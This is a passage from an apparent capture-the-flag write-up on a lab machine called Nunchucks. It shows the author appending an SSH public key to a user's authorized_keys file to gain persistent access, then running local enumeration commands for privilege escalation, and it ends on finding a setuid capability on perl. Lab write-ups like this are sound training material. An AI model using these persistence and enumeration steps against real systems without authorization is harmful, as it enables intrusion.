+<p>The goal is now to add our own SSH key to <code>/home/david/.ssh/authorized_keys</code> so that we can connect to Nunchucks using SSH.</p>
+<p>However, <code>david</code> doesn't have a <code>.ssh</code> folder, so let's remediate to that:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> mkdir <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/home/david/.ssh</span></span>
+</span></code></pre>
+<p>Then, I'll generate a SSH ed25519 key.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh-keygen<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Generating public/private ed25519 key pair.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Your identification has been saved in /workspace/id_ed25519
+</span><span class="z-text z-plain">Your public key has been saved in /workspace/id_ed25519.pub
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Now, let's add the public key to Nunchucks by executing this command through the Python script (replace the public key with your own):</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> echo <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ssh-ed25519</span></span><span class="z-meta z-function-call z-arguments z-shell"> AAAAC3NzaC1lZDI1NTE5AAAAIHaUBQzVpdSZy4we5Ja3x7eteMCiqfelHJPqKyK+Nc8r <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> /home/david/.ssh/authorized_keys</span>
+</span></code></pre>
+<p>Finally, let's use our private key to connect as <code>david</code> using SSH:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh david@10.10.11.122<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> id_ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.122 (10.10.11.122)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">Warning: Permanently added &#39;10.10.11.122&#39; (ED25519) to the list of known hosts.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">david@nunchucks:~$
+</span></code></pre>
+<p>We got a shell. Nice!</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>We already know that we got a foothold as <code>david</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution Nunchucks is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> lsb_release<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">No LSB modules are available.
+</span><span class="z-text z-plain">Distributor ID: Ubuntu
+</span><span class="z-text z-plain">Description:    Ubuntu 20.04.3 LTS
+</span><span class="z-text z-plain">Release:        20.04
+</span><span class="z-text z-plain">Codename:       focal
+</span></code></pre>
+<p>So this is Ubuntu 20.04.3, okay. That's pretty recent, so we're unlikely to find vulnerabilities here.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Nunchucks's architecture?</p>
+<pre class="z-code"><code><span class="z-text z-plain">david@nunchucks:~$ uname -m
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe Nunchucks is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.4.0-86-generic
+</span></code></pre>
+<p>Unfortunately, the kernel version is recent too.</p>
+<p>Yeah I know, very surprising.</p>
+<h2 id="apparmor">AppArmor</h2>
+<p>Let's list the applications AppArmor profiles:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  3222 Mar 11  2020 sbin.dhclient
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
+</span><span class="z-text z-plain">-rw-r--r--   1 root root   442 Sep 26  2021 usr.bin.perl
+</span><span class="z-text z-plain">-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  2006 Jul 22  2021 usr.sbin.mysqld
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
+</span></code></pre>
+<p>All of these profiles are classic, except the one for <code>perl</code>.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:81:df brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.10.11.122/23 brd 10.10.11.255 scope global ens160
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 dead:beef::250:56ff:feb9:81df/64 scope global dynamic mngtmpaddr 
+</span><span class="z-text z-plain">       valid_lft 86399sec preferred_lft 14399sec
+</span><span class="z-text z-plain">    inet6 fe80::250:56ff:feb9:81df/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>So there's only the loopback interface and the Ethernet interface.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is Nunchucks's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">nunchucks
+</span></code></pre>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">david
+</span></code></pre>
+<p>Okay, so there's only <code>david</code> (us) and <code>root</code>.</p>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">avahi
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">bluetooth
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">colord
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">david
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">geoclue
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">pulse
+</span><span class="z-text z-plain">pulse-access
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">rtkit
+</span><span class="z-text z-plain">saned
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">scanner
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's see to which groups we currently belong</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">david
+</span></code></pre>
+<p>Unfortunately we don't belong to the <code>lxd</code> group, but only to the default group for our user.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>We aleady began the exploration of our home folder earlier, and we noticed the user flag file. Let's retrieve its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">236309c71f2a053dd6585eb31bc315ce
+</span></code></pre>
+<h2 id="command-history">Command history</h2>
+<p>We can try to check the history of the commands our user ran, but it's discarded into <code>/dev/null</code>.</p>
+<h2 id="sudo-permissions">Sudo permissions</h2>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[sudo] password for david:
+</span></code></pre>
+<p>We're asked for <code>david</code>'s password, but we don't know it.</p>
+<h2 id="environment-variables">Environment variables</h2>
+<p>Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> env</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">SHELL=/bin/bash
+</span><span class="z-text z-plain">PWD=/home/david
+</span><span class="z-text z-plain">LOGNAME=david
+</span><span class="z-text z-plain">XDG_SESSION_TYPE=tty
+</span><span class="z-text z-plain">MOTD_SHOWN=pam
+</span><span class="z-text z-plain">HOME=/home/david
+</span><span class="z-text z-plain">LANG=en_GB.UTF-8
+</span><span class="z-text z-plain">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+</span><span class="z-text z-plain">SSH_CONNECTION=10.10.14.9 58418 10.10.11.122 22
+</span><span class="z-text z-plain">LESSCLOSE=/usr/bin/lesspipe %s %s
+</span><span class="z-text z-plain">XDG_SESSION_CLASS=user
+</span><span class="z-text z-plain">TERM=xterm-256color
+</span><span class="z-text z-plain">LESSOPEN=| /usr/bin/lesspipe %s
+</span><span class="z-text z-plain">USER=david
+</span><span class="z-text z-plain">SHLVL=1
+</span><span class="z-text z-plain">XDG_SESSION_ID=1
+</span><span class="z-text z-plain">XDG_RUNTIME_DIR=/run/user/1000
+</span><span class="z-text z-plain">SSH_CLIENT=10.10.14.9 58418 22
+</span><span class="z-text z-plain">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</span><span class="z-text z-plain">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+</span><span class="z-text z-plain">SSH_TTY=/dev/pts/0
+</span><span class="z-text z-plain">_=/usr/bin/env
+</span></code></pre>
+<p>I don't see anything out of the ordinary.</p>
+<h2 id="listening-ports">Listening ports</h2>
+<p>Let's see if any TCP local ports are listening for connections.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State                       Recv-Q                      Send-Q                                           Local Address:Port                                             Peer Address:Port                      Process                      
+</span><span class="z-text z-plain">LISTEN                      0                           511                                                    0.0.0.0:443                                                   0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           511                                                  127.0.0.1:8000                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           511                                                  127.0.0.1:8001                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           70                                                   127.0.0.1:33060                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           151                                                  127.0.0.1:3306                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           511                                                    0.0.0.0:80                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           4096                                             127.0.0.53%lo:53                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                    0.0.0.0:22                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                       [::]:22                                                       [::]:*
+</span></code></pre>
+<p>There's a few ports listening locally, including <code>3306/tcp</code> corresponding to MySQL.</p>
+<p>Let's check UDP open ports too.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>uln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State                       Recv-Q                      Send-Q                                           Local Address:Port                                             Peer Address:Port                      Process                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                127.0.0.53%lo:53                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                      0.0.0.0:5353                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                      0.0.0.0:58196                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                         [::]:5353                                                     [::]:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                         [::]:43351                                                    [::]:*
+</span></code></pre>
+<p>There's nothing special.</p>
+<h2 id="mysql-port-3306-tcp">MySQL (port <code>3306/tcp</code>)</h2>
+<p>We noticed that the port <code>3306/tcp</code> was open, which probably means that a MySQL instance is running on Nunchucks. Let's explore it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ERROR 1045 (28000): Access denied for user &#39;david&#39;@&#39;localhost&#39; (using password: NO)
+</span></code></pre>
+<p>We can't access it without a password. We can try common credentials, but it doesn't work.</p>
+<h2 id="processes">Processes</h2>
+<p>Let's use <code>pspy</code> to see which processes are running on Nunchucks.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /tmp/pspy</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>I don't see any cronjob.</p>
+<h2 id="suid-binaries">SUID binaries</h2>
+<p>Let's look for SUID binaries.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>perm</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>4000</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/fusermount
+</span><span class="z-text z-plain">/usr/bin/umount
+</span><span class="z-text z-plain">/usr/bin/chsh
+</span><span class="z-text z-plain">/usr/bin/chfn
+</span><span class="z-text z-plain">/usr/bin/at
+</span><span class="z-text z-plain">/usr/bin/mount
+</span><span class="z-text z-plain">/usr/bin/gpasswd
+</span><span class="z-text z-plain">/usr/bin/newgrp
+</span><span class="z-text z-plain">/usr/bin/passwd
+</span><span class="z-text z-plain">/usr/bin/pkexec
+</span><span class="z-text z-plain">/usr/bin/su
+</span><span class="z-text z-plain">/usr/bin/sudo
+</span><span class="z-text z-plain">/usr/lib/policykit-1/polkit-agent-helper-1
+</span><span class="z-text z-plain">/usr/lib/openssh/ssh-keysign
+</span><span class="z-text z-plain">/usr/lib/eject/dmcrypt-get-device
+</span><span class="z-text z-plain">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span class="z-text z-plain">/usr/sbin/pppd
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse to escalate our privileges.</p>
+<h2 id="capabilities">Capabilities</h2>
+<p>Let's see which files have special capabilities.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>type</span> f<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>exec</span> getcap <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span><span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span> <span class="z-constant z-character z-escape z-shell">\;</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/perl = cap_setuid+ep
+</span><span class="z-text z-plain">/usr/bin/mtr-packet = cap_net_raw+ep
+</span><span class="z-text z-plain">/usr/bin/ping = cap_net_raw+ep
+</span><span class="z-text z-plain">/usr/bin/traceroute6.iputils = cap_net_raw+ep
+</span><span class="z-text z-plain">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+</span></code></pre>
+<p>Most of these files and capabilities are expected, except for <code>/usr/bin/perl</code>. It has the <code>cap_setuid</code> capability set to <code>ep</code>, which means that it has the ability to set its effective user ID, and it's allowed to do so during its execution!</p>
+<p>This must be our way to get <code>root</code>. It's probably used to execute Perl scripts, so let's search for one:</p>
